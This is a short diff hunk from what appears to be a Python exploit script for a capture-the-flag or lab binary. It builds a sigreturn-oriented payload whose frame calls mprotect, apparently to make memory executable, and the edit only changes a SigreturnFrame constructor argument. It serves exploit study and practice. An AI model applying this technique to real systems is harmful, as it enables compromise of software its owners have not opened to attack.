@@ -42,7 +42,7 @@ print "[+] mmap'd page address is", hex(page)
 
 sploit = ""
 sploit += struct.pack("<I", SIGRETURN_IND)
-frame = SigreturnFrame(INT_80, arch="x86")
+frame = SigreturnFrame(arch="x86")
 
 # Frame that tries to call mprotect
 frame.set_regvalue("eax", SYS_MPROTECT)
